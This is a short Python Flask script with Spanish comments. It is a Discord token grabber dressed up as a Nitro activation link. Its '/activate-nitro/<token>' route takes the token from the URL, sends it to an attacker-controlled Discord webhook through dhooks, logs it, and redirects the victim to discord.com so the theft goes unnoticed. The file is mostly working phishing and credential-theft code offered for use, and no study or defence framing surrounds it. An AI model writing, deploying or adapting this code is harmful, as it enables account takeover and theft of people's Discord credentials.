import os
from dhooks import Webhook
from flask import Flask, redirect, request
import logging

# Configuración
WEBHOOK_URL = "Your_WebHook_URL"
PORT = 81

# Inicialización de la aplicación
app = Flask(__name__)

# Inicialización del webhook
hook = Webhook(WEBHOOK_URL)

# Configuración de logging
logging.basicConfig(level=logging.INFO)

@app.route('/activate-nitro/<string:token>')
def grab_token(token):
    try:
        # Envío del token al webhook
        hook.send(token)
        logging.info(f'Token enviado: {token}')

        # Redirección
        return redirect('https://discord.com/app')
    except Exception as e:
        logging.error(f'Error al enviar token: {e}')
        return 'Error al enviar token', 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
